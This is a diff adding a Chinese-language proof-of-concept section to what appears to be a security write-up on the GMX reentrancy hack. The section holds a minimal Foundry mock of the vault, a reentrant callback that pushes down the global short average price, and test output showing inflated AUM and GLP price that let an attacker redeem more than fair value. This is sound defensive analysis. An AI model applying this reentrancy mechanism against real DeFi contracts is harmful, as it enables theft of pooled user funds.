@@ -121,6 +121,73 @@
 
 ---
 
+## PoC(可运行复现)
+
+> 这是一个 **Foundry 最小化模型**,目的不是逐字节复刻 GMX 代码库,而是忠实复现漏洞**本质**:`executeDecreaseOrder` 的 `gmxPositionCallback` 回调发生在**状态最终化之前**,攻击者在「`globalShortSize` 已临时缩小、`globalShortAveragePrice` 尚未重算」的不一致窗口里**重入**开空,用低入场价把全局空头均价砸低,从而虚高 `getAum()` / GLP 价并多赎回。数值为演示用的合理量级,方向与安全方披露一致(均价 ~$108,757 被砸至 ~$1,913 / ~57x;GLP 被以失真价处理)。
+
+**工程结构**:`/tmp/duolasafe-audits/PoC/gmx/`(`foundry.toml` solc=0.8.24 + `test/GMX.t.sol`,不依赖 forge-std,用 `external` 测试函数 + `require` 断言)。
+
+**核心机制(节选 `test/GMX.t.sol`)**:
+
+```solidity
+// MockVault:维护全局空头会计 + AUM。空头是池子对手盘:
+//   shortPnlForPool = shortSize * (markPrice - avgPrice) / avgPrice
+//   avgPrice 被砸低 → 系统误判空头巨亏 → 池子「虚赚」→ AUM 虚高。
+
+// executeDecreaseOrder:复刻真实时序 —— size 先临时下降,回调插在
+// 「size 已改、avgPrice 尚未重算」的不一致窗口里:
+function executeDecreaseOrder(address account, uint256 decreaseSize) external {
+    if (vulnerableOrder) {
+        globalShortSize -= decreaseSize;          // (1) size 临时缩到极小
+        pendingSizeRestore = decreaseSize;
+        IPositionCallback(account).gmxPositionCallback(); // (2) 回调:不一致窗口
+        globalShortSize += pendingSizeRestore;    // (4) 结算尾段才补回 size
+    }
+}
+
+// 重入路径:用「当前(被缩小的)size」作分母 blend 均价,使低入场价被
+// 过度加权 → 把 globalShortAveragePrice 砸到远低于市价(失同步根源):
+function increaseShortReenter(uint256 addSize, uint256 entryPrice) external {
+    uint256 oldSize = globalShortSize;                    // ← 被缩小的 size
+    uint256 newSize = oldSize + addSize;
+    globalShortAveragePrice =
+        (oldSize * globalShortAveragePrice + addSize * entryPrice) / newSize;
+    globalShortSize += addSize;
+}
+
+// 攻击者在回调里重入:
+function gmxPositionCallback() external {
+    vault.increaseShortReenter(reentryShortSize, reentryEntryPrice); // 低入场价砸均价
+}
+```
+
+三个测试:`testNormalOrderKeepsAumStable`(正常顺序按市价开空 → 均价稳定、AUM 不变,作对照)、`testReentrancyInflatesAum`(重入 → 均价被砸 >10x、AUM 与 GLP 价被抬高、且 AUM > 正常顺序)、`testAttackerRedeemsMore`(同一笔 GLP 在重入抬价后赎回 > 公允价值,差额即利润)。
+
+**运行命令与输出**:
+
+```
+$ export PATH="$HOME/.foundry/bin:$PATH"
+$ cd /tmp/duolasafe-audits/PoC/gmx && forge test -vv
+
+Compiling 1 files with Solc 0.8.24
+Solc 0.8.24 finished in 102.50ms
+Compiler run successful!
+
+Ran 3 tests for test/GMX.t.sol:GMXReentrancyTest
+[PASS] testAttackerRedeemsMore() (gas: 1791506)
+[PASS] testNormalOrderKeepsAumStable() (gas: 727892)
+[PASS] testReentrancyInflatesAum() (gas: 1803702)
+Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.12ms
+
+Ran 1 test suite in 313.84ms: 3 tests passed, 0 failed, 0 skipped (3 total tests)
+```
+
+**复现到的数值(模型量级)**:全局空头均价从约 **$108,757** 被砸至约 **$2,368**(≈46x 偏离,与安全方披露的 ~$1,913 / ~57x 同方向同量级)→ AUM 从约 **$6.00M** 虚高到约 **$10.73M** → GLP 单价从 **$1.00** 抬到约 **$1.79** → 攻击者用 100 万份 GLP 赎回约 **$1.79M**(公允仅 $1.00M),凭空套出约 **$0.79M** 差额。把规模放大到真实闪电贷本金量级,即对应 ~$42M 级别的抽水。
+
+**解释**:本 PoC 展示的核心是「**回调先于状态更新 → 重入读到不一致状态**」这一漏洞本质 —— `globalShortSize` 与 `globalShortAveragePrice` 没有在同一原子操作内同步更新,且执行函数把控制权交给了任意 `_account` 合约。对照测试证明:同样规模的空头,走合法(原子同步)路径 AUM 纹丝不动,走重入(失同步)路径 AUM 被人为抬高 —— 二者差额正是攻击者的套利空间。这与 §6 修复建议(会计原子性 + `nonReentrant` + EOA 校验 + 均价偏离边界)一一对应。
+
+---
+
 ## 来源
 
 - 慢雾 SlowMist — Inside the GMX Hack: $42 Million Vanishes in an Instant: https://slowmist.medium.com/inside-the-gmx-hack-42-million-vanishes-in-an-instant-6e42adbdead0
